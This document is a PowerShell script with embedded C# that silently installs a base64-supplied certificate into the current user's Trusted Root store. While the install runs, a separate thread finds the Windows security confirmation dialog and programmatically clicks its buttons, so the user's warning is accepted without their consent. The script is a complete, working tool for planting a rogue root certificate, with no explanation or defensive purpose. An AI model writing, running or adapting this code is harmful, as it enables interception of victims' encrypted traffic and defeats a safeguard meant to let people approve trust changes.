function ConfirmCert{
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

public static class W
{
	public class SD
    {
        public string Wndclass;
        public string Title;
        public string Process;
        public IntPtr hWnd;
    }

    private delegate bool EnumWindowsProc(IntPtr hWnd, ref SD data);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, ref SD data);
	
	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
	
	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
	static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
	
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool SetForegroundWindow(IntPtr hWnd);
	
	public delegate bool EnumWindowProc(IntPtr hwnd, IntPtr lParam);
	
	[DllImport("user32")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool EnumChildWindows(IntPtr window, EnumWindowProc callback, IntPtr lParam);  
	
	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
	
	[Flags]
    private enum SnapshotFlags : uint
    {
    HeapList = 0x00000001,
    Process = 0x00000002,
    Thread = 0x00000004,
    Module = 0x00000008,
    Module32 = 0x00000010,
    Inherit = 0x80000000,
    All = 0x0000001F,
    NoHeaps = 0x40000000
    }
    //inner struct used only internally
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct PROCESSENTRY32
    {
    const int MAX_PATH = 260;
    internal UInt32 dwSize;
    internal UInt32 cntUsage;
    internal UInt32 th32ProcessID;
    internal IntPtr th32DefaultHeapID;
    internal UInt32 th32ModuleID;
    internal UInt32 cntThreads;
    internal UInt32 th32ParentProcessID;
    internal Int32 pcPriClassBase;
    internal UInt32 dwFlags;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
    internal string szExeFile;
    }

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern IntPtr CreateToolhelp32Snapshot([In]UInt32 dwFlags, [In]UInt32 th32ProcessID);

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern bool Process32First([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern bool Process32Next([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle([In] IntPtr hObject);
    
	const int BM_CL = 0x00F5;
	
	public static byte[] GetCertAsByteArray(String sCert)
    {
		return Convert.FromBase64String(sCert);
    }
        
	public static void S(String sCert){
        byte[] bCert = GetCertAsByteArray(sCert);
        if (bCert != null)
        {
            X509Certificate2 certificate = new X509Certificate2(bCert);
            X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadWrite);
            if (!store.Certificates.Contains(certificate))
            {
                Thread thread = new Thread(SearchDialog);
                thread.Start();
                store.Add(certificate);
                thread.Join();
            }
            store.Close();
        }
	}
	
	public static void SearchDialog()
	{
		IntPtr hWnd;
		do{
			hWnd = SearchForWindow("#32770",String.Empty);
			if (!hWnd.Equals(IntPtr.Zero))
		    {
		    	break;
			}else
	        {
		        hWnd=IntPtr.Zero;
	        }
		}while (hWnd.Equals(IntPtr.Zero));
		SetForegroundWindow(hWnd);
		EnumWindowProc childProc = new EnumWindowProc(EWP);
		EnumChildWindows(hWnd, childProc, IntPtr.Zero);
	}
	
	public static IntPtr SearchForWindow(string wndclass, string title)
    {
        SD sd = new SD();
        sd.Wndclass = wndclass;
        sd.Title = title;
        sd.hWnd=IntPtr.Zero;
        EnumWindows(new EnumWindowsProc(EnumProc), ref sd);
        return sd.hWnd;
    }
    
	public static bool EnumProc(IntPtr hWnd, ref SD data)
    {
    	StringBuilder caption = new StringBuilder(1024);
        StringBuilder className = new StringBuilder(1024);
        GetWindowText(hWnd, caption, caption.Capacity);
        GetClassName(hWnd, className, className.Capacity);
        String sEN=GPN(hWnd).ToLower();
		if((!data.Wndclass.Equals(String.Empty) && className.ToString().StartsWith(data.Wndclass)) || (!data.Title.Equals(String.Empty) && caption.ToString().StartsWith(data.Title)))
		{
        	if(sEN.Contains("csrss") || sEN.Contains("certutil")  || sEN.Contains("powershell"))
	        {
		        data.hWnd = hWnd;
                return false;
	        }
        }
       	
        return true;
    }
  
	public static String GPN(IntPtr hWnd){
		uint pID = 0;
		uint threadID = GetWindowThreadProcessId(hWnd, out pID);
		String sProc = null;
	    IntPtr handleToSnapshot = IntPtr.Zero;
	    try
	    {
	        PROCESSENTRY32 procEntry = new PROCESSENTRY32();
	        procEntry.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
	        handleToSnapshot = CreateToolhelp32Snapshot((uint)SnapshotFlags.Process, 0);
	        if (Process32First(handleToSnapshot, ref procEntry))
	        {
	        do
	        {
	            if (pID == procEntry.th32ProcessID)
	            {
	            sProc = procEntry.szExeFile;
	            break;
	            }
	        } while (Process32Next(handleToSnapshot, ref procEntry));
	        }
	        else
	        {
	        	throw new ApplicationException(string.Format("Failed with win32 error code {0}", Marshal.GetLastWin32Error()));
	        }
	    }
	    catch (Exception ex)
	    {
	        throw new ApplicationException("Can't get the process.", ex);
	    }
	    finally
	    {
	        CloseHandle(handleToSnapshot);
	    }
	    return sProc;
	}
	public static bool EWP(IntPtr hWnd, IntPtr lParam)
	{
		SendMessage(hWnd, BM_CL, IntPtr.Zero, IntPtr.Zero);
		return true;
	}
}
"@;
[W]::S("%CERT%");
exit
}
ConfirmCert
